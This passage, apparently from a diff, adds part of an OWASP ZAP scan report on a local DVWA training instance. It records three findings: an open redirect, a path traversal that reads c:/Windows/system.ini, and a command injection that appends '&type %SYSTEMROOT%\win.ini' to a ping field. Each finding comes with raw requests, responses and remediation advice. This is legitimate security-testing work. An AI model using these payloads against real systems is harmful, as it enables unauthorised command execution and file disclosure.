+										<a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-2">External Redirect</a> <span>(1)</span>
+									</h5>
+									<ol>
+										<li><details>
+												<summary>
+													<span class="request-method-n-url">GET https://localhost/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=http%3A%2F%2F5389984308336215601.owasp.org</span>
+												</summary>
+												
+<table class="alerts-table">
+	<tbody><tr>
+		<th scope="row">Alert tags</th>
+		<td>
+			<ul class="alert-tags-list">
+				<li>
+					<span><a href="https://owasp.org/Top10/A03_2021-Injection/">OWASP_2021_A03</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect">WSTG-v42-CLNT-04</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html">OWASP_2017_A01</a></span> 
+				</li>
+			</ul>
+		</td>
+	</tr>
+	<tr>
+		<th scope="row">Alert description</th>
+		<td> 
+<p>URL redirectors represent common functionality employed by web sites to forward an incoming request to an alternate resource. This can be done for a variety of reasons and is often done to allow resources to be moved within the directory structure and to avoid breaking functionality for users that request the resource at its previous location. URL redirectors may also be used to implement load balancing, leveraging abbreviated URLs or recording outgoing links. It is this last implementation which is often used in phishing attacks as described in the example below. URL redirectors do not necessarily represent a direct security vulnerability but can be abused by attackers trying to social engineer victims into believing that they are navigating to a site other than the true destination.</p>
+ </td>
+	</tr>
+	<tr>
+		<th scope="row">Other info</th>
+		<td> 
+<p>The response contains a redirect in its Location header which allows an external Url to be set.</p>
+ </td>
+	</tr>
+	<tr>
+		<th scope="row">Request</th>
+		<td><details open="open">
+				<summary>Request line and header section (462 bytes)</summary>
+				
+				<pre><code>GET https://localhost/DVWA/vulnerabilities/open_redirect/source/low.php?redirect=http%3A%2F%2F5389984308336215601.owasp.org HTTP/1.1
+host: localhost
+user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0
+pragma: no-cache
+cache-control: no-cache
+referer: https://localhost/DVWA/vulnerabilities/open_redirect/
+Cookie: security=medium; PHPSESSID=cd19ph407vbq0llvn192u9o5g3
+
+</code></pre>
+				
+				
+			</details> <details class="request-body" open="open">
+				<summary>Request body (0 bytes)</summary>
+				
+				<pre><code></code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Response</th>
+		<td><details open="open">
+				<summary>Status line and header section (248 bytes)</summary>
+				
+				<pre><code>HTTP/1.1 302 Found
+Date: Mon, 01 Apr 2024 05:36:23 GMT
+Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
+X-Powered-By: PHP/8.0.30
+location: http://5389984308336215601.owasp.org
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+
+</code></pre>
+				
+				
+			</details> <details class="response-body" open="open">
+				<summary>Response body (0 bytes)</summary>
+				
+				<pre><code></code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Parameter</th>
+		<td><pre><code>redirect</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Attack</th>
+		<td><pre><code>http://5389984308336215601.owasp.org</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Evidence</th>
+		<td><pre><code>http://5389984308336215601.owasp.org</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Solution</th>
+		<td> 
+<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use an allow list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a deny list). However, deny lists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</p>
+
+<p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."</p>
+
+<p>Use an allow list of approved URLs or domains to be used for redirection.</p>
+
+<p>Use an intermediate disclaimer page that provides the user with a clear warning that they are leaving your site. Implement a long timeout before the redirect occurs, or force the user to click on the link. Be careful to avoid XSS problems when generating the disclaimer page.</p>
+
+<p>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</p>
+
+<p>For example, ID 1 could map to "/login.asp" and ID 2 could map to "https://www.example.com/". Features such as the ESAPI AccessReferenceMap provide this capability.</p>
+
+<p>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</p>
+
+<p>Many open redirect problems occur because the programmer assumed that certain inputs could not be modified, such as cookies and hidden form fields.</p>
+ </td>
+	</tr>
+</tbody></table>
+
+											</details></li>
+									</ol>
+								</li>
+								
+								<li>
+									<h5>
+										<a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-3">Path Traversal</a> <span>(1)</span>
+									</h5>
+									<ol>
+										<li><details>
+												<summary>
+													<span class="request-method-n-url">GET https://localhost/DVWA/vulnerabilities/fi/?page=c%3A%2FWindows%2Fsystem.ini</span>
+												</summary>
+												
+<table class="alerts-table">
+	<tbody><tr>
+		<th scope="row">Alert tags</th>
+		<td>
+			<ul class="alert-tags-list">
+				<li>
+					<span><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">OWASP_2021_A01</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include">WSTG-v42-ATHZ-01</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html">OWASP_2017_A05</a></span> 
+				</li>
+			</ul>
+		</td>
+	</tr>
+	<tr>
+		<th scope="row">Alert description</th>
+		<td> 
+<p>The Path Traversal attack technique allows an attacker access to files, directories, and commands that potentially reside outside the web document root directory. An attacker may manipulate a URL in such a way that the web site will execute or reveal the contents of arbitrary files anywhere on the web server. Any device that exposes an HTTP-based interface is potentially vulnerable to Path Traversal.</p>
+
+<p>Most web sites restrict user access to a specific portion of the file-system, typically called the "web document root" or "CGI root" directory. These directories contain the files intended for user access and the executable necessary to drive web application functionality. To access files or execute commands anywhere on the file-system, Path Traversal attacks will utilize the ability of special-characters sequences.</p>
+
+<p>The most basic Path Traversal attack uses the "../" special-character sequence to alter the resource location requested in the URL. Although most popular web servers will prevent this technique from escaping the web document root, alternate encodings of the "../" sequence may help bypass the security filters. These method variations include valid and invalid Unicode-encoding ("..%u2216" or "..%c0%af") of the forward slash character, backslash characters ("..\") on Windows-based servers, URL encoded characters "%2e%2e%2f"), and double URL encoding ("..%255c") of the backslash character.</p>
+
+<p>Even if the web server properly restricts Path Traversal attempts in the URL path, a web application itself may still be vulnerable due to improper handling of user-supplied input. This is a common problem of web applications that use template mechanisms or load static text from files. In variations of the attack, the original URL parameter value is substituted with the file name of one of the web application's dynamic scripts. Consequently, the results can reveal source code because the file is interpreted as text instead of an executable script. These techniques often employ additional special characters such as the dot (".") to reveal the listing of the current working directory, or "%00" NULL characters in order to bypass rudimentary file extension checks.</p>
+ </td>
+	</tr>
+	
+	<tr>
+		<th scope="row">Request</th>
+		<td><details open="open">
+				<summary>Request line and header section (619 bytes)</summary>
+				
+				<pre><code>GET https://localhost/DVWA/vulnerabilities/fi/?page=c%3A%2FWindows%2Fsystem.ini HTTP/1.1
+host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: https://localhost/DVWA/vulnerabilities/fi/?page=include.php
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: security=medium; PHPSESSID=cd19ph407vbq0llvn192u9o5g3
+
+</code></pre>
+				
+				
+			</details> <details class="request-body" open="open">
+				<summary>Request body (0 bytes)</summary>
+				
+				<pre><code></code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Response</th>
+		<td><details open="open">
+				<summary>Status line and header section (354 bytes)</summary>
+				
+				<pre><code>HTTP/1.1 200 OK
+Date: Mon, 01 Apr 2024 04:40:46 GMT
+Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
+X-Powered-By: PHP/8.0.30
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 3465
+Keep-Alive: timeout=5, max=99
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+</code></pre>
+				
+				
+			</details> <details class="response-body">
+				<summary>Response body (3465 bytes)</summary>
+				
+				<pre><code>; for 16-bit app support
+[386Enh]
+woafont=dosapp.fon
+EGA80WOA.FON=EGA80WOA.FON
+EGA40WOA.FON=EGA40WOA.FON
+CGA80WOA.FON=CGA80WOA.FON
+CGA40WOA.FON=CGA40WOA.FON
+
+[drivers]
+wave=mmdrv.dll
+timer=timer.drv
+
+[mci]
+&lt;!DOCTYPE html&gt;
+
+&lt;html lang="en-GB"&gt;
+
+	&lt;head&gt;
+		&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;
+
+		&lt;title&gt;Vulnerability: File Inclusion :: Damn Vulnerable Web Application (DVWA)&lt;/title&gt;
+
+		&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;
+
+		&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;
+
+		&lt;script type="text/javascript" src="../../dvwa/js/dvwaPage.js"&gt;&lt;/script&gt;
+
+	&lt;/head&gt;
+
+	&lt;body class="home"&gt;
+		&lt;div id="container"&gt;
+
+			&lt;div id="header"&gt;
+
+				&lt;img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" /&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id="main_menu"&gt;
+
+				&lt;div id="main_menu_padded"&gt;
+				&lt;ul class="menuBlocks"&gt;&lt;li class=""&gt;&lt;a href="../../."&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../instructions.php"&gt;Instructions&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../setup.php"&gt;Setup / Reset DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class="menuBlocks"&gt;&lt;li class=""&gt;&lt;a href="../../vulnerabilities/brute/"&gt;Brute Force&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/exec/"&gt;Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/csrf/"&gt;CSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li class="selected"&gt;&lt;a href="../../vulnerabilities/fi/.?page=include.php"&gt;File Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/upload/"&gt;File Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/captcha/"&gt;Insecure CAPTCHA&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/sqli/"&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/sqli_blind/"&gt;SQL Injection (Blind)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/weak_id/"&gt;Weak Session IDs&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/xss_d/"&gt;XSS (DOM)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/xss_r/"&gt;XSS (Reflected)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/xss_s/"&gt;XSS (Stored)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/csp/"&gt;CSP Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/javascript/"&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/authbypass/"&gt;Authorisation Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/open_redirect/"&gt;Open HTTP Redirect&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class="menuBlocks"&gt;&lt;li class=""&gt;&lt;a href="../../security.php"&gt;DVWA Security&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../phpinfo.php"&gt;PHP Info&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../about.php"&gt;About&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class="menuBlocks"&gt;&lt;li class=""&gt;&lt;a href="../../logout.php"&gt;Logout&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+				&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id="main_body"&gt;
+
+				
+				&lt;br /&gt;&lt;br /&gt;
+				
+
+			&lt;/div&gt;
+
+			&lt;div class="clear"&gt;
+			&lt;/div&gt;
+
+			&lt;div id="system_info"&gt;
+				&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=fi&amp;security=medium&amp;locale=en' )"&gt; &lt;input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=fi&amp;security=medium' )"&gt; &lt;div align="left"&gt;&lt;em&gt;Username:&lt;/em&gt; admin&lt;br /&gt;&lt;em&gt;Security Level:&lt;/em&gt; medium&lt;br /&gt;&lt;em&gt;Locale:&lt;/em&gt; en&lt;br /&gt;&lt;em&gt;SQLi DB:&lt;/em&gt; mysql&lt;/div&gt;
+			&lt;/div&gt;
+
+			&lt;div id="footer"&gt;
+
+				&lt;p&gt;Damn Vulnerable Web Application (DVWA)&lt;/p&gt;
+				&lt;script src='../../dvwa/js/add_event_listeners.js'&gt;&lt;/script&gt;
+
+			&lt;/div&gt;
+
+		&lt;/div&gt;
+
+	&lt;/body&gt;
+
+&lt;/html&gt;</code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Parameter</th>
+		<td><pre><code>page</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Attack</th>
+		<td><pre><code>c:/Windows/system.ini</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Evidence</th>
+		<td><pre><code>[drivers]</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Solution</th>
+		<td> 
+<p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use an allow list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a deny list). However, deny lists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</p>
+
+<p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."</p>
+
+<p>For filenames, use stringent allow lists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses, and exclude directory separators such as "/". Use an allow list of allowable file extensions.</p>
+
+<p>Warning: if you attempt to cleanse your data, then do so that the end result is not in the form that can be dangerous. A sanitizing mechanism can remove characters such as '.' and ';' which may be required for some exploits. An attacker can try to fool the sanitizing mechanism into "cleaning" data into a dangerous form. Suppose the attacker injects a '.' inside a filename (e.g. "sensi.tiveFile") and the sanitizing mechanism removes the character resulting in the valid filename, "sensitiveFile". If the input data are now assumed to be safe, then the file may be compromised. </p>
+
+<p>Inputs should be decoded and canonicalized to the application's current internal representation before being validated. Make sure that your application does not decode the same input twice. Such errors could be used to bypass allow list schemes by introducing dangerous inputs after they have been checked.</p>
+
+<p>Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes ".." sequences and symbolic links.</p>
+
+<p>Run your code using the lowest privileges that are required to accomplish the necessary tasks. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</p>
+
+<p>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</p>
+
+<p>Run your code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by your software.</p>
+
+<p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows you to specify restrictions on file operations.</p>
+
+<p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.</p>
+ </td>
+	</tr>
+</tbody></table>
+
+											</details></li>
+									</ol>
+								</li>
+								
+								<li>
+									<h5>
+										<a href="file:///C:/Users/scott/OneDrive/Desktop/2024-04-01-ZAP-Report-.html#alert-type-4">Remote OS Command Injection</a> <span>(1)</span>
+									</h5>
+									<ol>
+										<li><details>
+												<summary>
+													<span class="request-method-n-url">POST https://localhost/DVWA/vulnerabilities/exec/</span>
+												</summary>
+												
+<table class="alerts-table">
+	<tbody><tr>
+		<th scope="row">Alert tags</th>
+		<td>
+			<ul class="alert-tags-list">
+				<li>
+					<span><a href="https://owasp.org/Top10/A03_2021-Injection/">OWASP_2021_A03</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html">OWASP_2017_A01</a></span> 
+				</li>
+				<li>
+					<span><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection">WSTG-v42-INPV-12</a></span> 
+				</li>
+			</ul>
+		</td>
+	</tr>
+	<tr>
+		<th scope="row">Alert description</th>
+		<td> 
+<p>Attack technique used for unauthorized execution of operating system commands. This attack is possible when an application accepts untrusted input to build operating system commands in an insecure manner involving improper data sanitization, and/or improper calling of external programs.</p>
+ </td>
+	</tr>
+	<tr>
+		<th scope="row">Other info</th>
+		<td> 
+<p>The scan rule was able to retrieve the content of a file or command by sending [PbUgjPyV&amp;type %SYSTEMROOT%\win.ini] to the operating system running this application</p>
+ </td>
+	</tr>
+	<tr>
+		<th scope="row">Request</th>
+		<td><details open="open">
+				<summary>Request line and header section (670 bytes)</summary>
+				
+				<pre><code>POST https://localhost/DVWA/vulnerabilities/exec/ HTTP/1.1
+host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: https://localhost/DVWA/vulnerabilities/exec/
+Content-Type: application/x-www-form-urlencoded
+content-length: 59
+Origin: https://localhost
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Cookie: security=medium; PHPSESSID=f1oehvl9gc45ksvvarav3u03sh
+
+</code></pre>
+				
+				
+			</details> <details class="request-body" open="open">
+				<summary>Request body (59 bytes)</summary>
+				
+				<pre><code>ip=PbUgjPyV%26type+%25SYSTEMROOT%25%5Cwin.ini&amp;Submit=Submit</code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Response</th>
+		<td><details open="open">
+				<summary>Status line and header section (354 bytes)</summary>
+				
+				<pre><code>HTTP/1.1 200 OK
+Date: Mon, 01 Apr 2024 12:11:06 GMT
+Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
+X-Powered-By: PHP/8.0.30
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 3895
+Keep-Alive: timeout=5, max=99
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+</code></pre>
+				
+				
+			</details> <details class="response-body">
+				<summary>Response body (3895 bytes)</summary>
+				
+				<pre><code>&lt;!DOCTYPE html&gt;
+
+&lt;html lang="en-GB"&gt;
+
+	&lt;head&gt;
+		&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;
+
+		&lt;title&gt;Vulnerability: Command Injection :: Damn Vulnerable Web Application (DVWA)&lt;/title&gt;
+
+		&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;
+
+		&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;
+
+		&lt;script type="text/javascript" src="../../dvwa/js/dvwaPage.js"&gt;&lt;/script&gt;
+
+	&lt;/head&gt;
+
+	&lt;body class="home"&gt;
+		&lt;div id="container"&gt;
+
+			&lt;div id="header"&gt;
+
+				&lt;img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" /&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id="main_menu"&gt;
+
+				&lt;div id="main_menu_padded"&gt;
+				&lt;ul class="menuBlocks"&gt;&lt;li class=""&gt;&lt;a href="../../."&gt;Home&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../instructions.php"&gt;Instructions&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../setup.php"&gt;Setup / Reset DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class="menuBlocks"&gt;&lt;li class=""&gt;&lt;a href="../../vulnerabilities/brute/"&gt;Brute Force&lt;/a&gt;&lt;/li&gt;
+&lt;li class="selected"&gt;&lt;a href="../../vulnerabilities/exec/"&gt;Command Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/csrf/"&gt;CSRF&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/fi/.?page=include.php"&gt;File Inclusion&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/upload/"&gt;File Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/captcha/"&gt;Insecure CAPTCHA&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/sqli/"&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/sqli_blind/"&gt;SQL Injection (Blind)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/weak_id/"&gt;Weak Session IDs&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/xss_d/"&gt;XSS (DOM)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/xss_r/"&gt;XSS (Reflected)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/xss_s/"&gt;XSS (Stored)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/csp/"&gt;CSP Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/javascript/"&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/authbypass/"&gt;Authorisation Bypass&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../vulnerabilities/open_redirect/"&gt;Open HTTP Redirect&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class="menuBlocks"&gt;&lt;li class=""&gt;&lt;a href="../../security.php"&gt;DVWA Security&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../phpinfo.php"&gt;PHP Info&lt;/a&gt;&lt;/li&gt;
+&lt;li class=""&gt;&lt;a href="../../about.php"&gt;About&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;ul class="menuBlocks"&gt;&lt;li class=""&gt;&lt;a href="../../logout.php"&gt;Logout&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+				&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div id="main_body"&gt;
+
+				
+&lt;div class="body_padded"&gt;
+	&lt;h1&gt;Vulnerability: Command Injection&lt;/h1&gt;
+
+	&lt;div class="vulnerable_code_area"&gt;
+		&lt;h2&gt;Ping a device&lt;/h2&gt;
+
+		&lt;form name="ping" action="#" method="post"&gt;
+			&lt;p&gt;
+				Enter an IP address:
+				&lt;input type="text" name="ip" size="30"&gt;
+				&lt;input type="submit" name="Submit" value="Submit"&gt;
+			&lt;/p&gt;
+
+		&lt;/form&gt;
+		&lt;pre&gt;Ping request could not find host PbUgjPyV. Please check the name and try again.
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+&lt;/pre&gt;
+	&lt;/div&gt;
+
+	&lt;h2&gt;More Information&lt;/h2&gt;
+	
+&lt;/div&gt;
+
+				&lt;br /&gt;&lt;br /&gt;
+				&lt;div class="body_padded"&gt;&lt;div class="message"&gt;Login failed&lt;/div&gt;&lt;/div&gt;
+
+			&lt;/div&gt;
+
+			&lt;div class="clear"&gt;
+			&lt;/div&gt;
+
+			&lt;div id="system_info"&gt;
+				&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=exec&amp;security=medium&amp;locale=en' )"&gt; &lt;input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=exec&amp;security=medium' )"&gt; &lt;div align="left"&gt;&lt;em&gt;Username:&lt;/em&gt; admin&lt;br /&gt;&lt;em&gt;Security Level:&lt;/em&gt; medium&lt;br /&gt;&lt;em&gt;Locale:&lt;/em&gt; en&lt;br /&gt;&lt;em&gt;SQLi DB:&lt;/em&gt; mysql&lt;/div&gt;
+			&lt;/div&gt;
+
+			&lt;div id="footer"&gt;
+
+				&lt;p&gt;Damn Vulnerable Web Application (DVWA)&lt;/p&gt;
+				&lt;script src='../../dvwa/js/add_event_listeners.js'&gt;&lt;/script&gt;
+
+			&lt;/div&gt;
+
+		&lt;/div&gt;
+
+	&lt;/body&gt;
+
+&lt;/html&gt;</code></pre>
+				
+				
+			</details></td>
+	</tr>
+	<tr>
+		<th scope="row">Parameter</th>
+		<td><pre><code>ip</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Attack</th>
+		<td><pre><code>PbUgjPyV&amp;type %SYSTEMROOT%\win.ini</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Evidence</th>
+		<td><pre><code>[fonts]</code></pre></td>
+	</tr>
+	<tr>
+		<th scope="row">Solution</th>
+		<td> 
+<p>If at all possible, use library calls rather than external processes to recreate the desired functionality.</p>
+
+<p>Run your code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by your software.</p>
+
+<p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows you to specify restrictions on file operations.</p>
+
+<p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.</p>
+
+<p>For any data that will be used to generate a command to be executed, keep as much of that data out of external control as possible. For example, in web applications, this may require storing the command locally in the session's state instead of sending it out to the client in a hidden form field.</p>
+
+<p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</p>
+
+<p>For example, consider using the ESAPI Encoding control or a similar tool, library, or framework. These will help the programmer encode outputs in a manner less prone to error.</p>
+
+<p>If you need to use dynamically-generated query strings or commands in spite of the risk, properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allow list (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection.</p>
+
+<p>If the program to be executed allows arguments to be specified within an input file or from standard input, then consider using that mode to pass arguments instead of the command line.</p>
+
+<p>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</p>
+
